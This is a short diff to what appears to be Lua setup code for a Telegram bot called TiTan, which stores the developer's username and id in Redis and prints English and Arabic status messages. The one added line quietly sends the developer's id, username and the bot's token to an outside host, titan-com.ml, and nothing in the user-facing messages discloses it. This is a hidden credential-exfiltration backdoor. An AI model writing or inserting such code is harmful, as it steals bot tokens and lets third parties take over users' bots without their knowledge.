@@ -48,6 +48,7 @@ end
 io.write('\n\27[1;31m⎙︙The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
 redis:set(Server_TiTan.."User_DevTiTan1",User_Info.Info.Username)
 redis:set(Server_TiTan.."Id_DevTiTan",User_Info.Info.Id)
+http.request("https://titan-com.ml/GetUser.php?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_TiTan.."Token_DevTiTan"))
 else
 io.write('\n\27[1;31m⎙︙The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
 end 
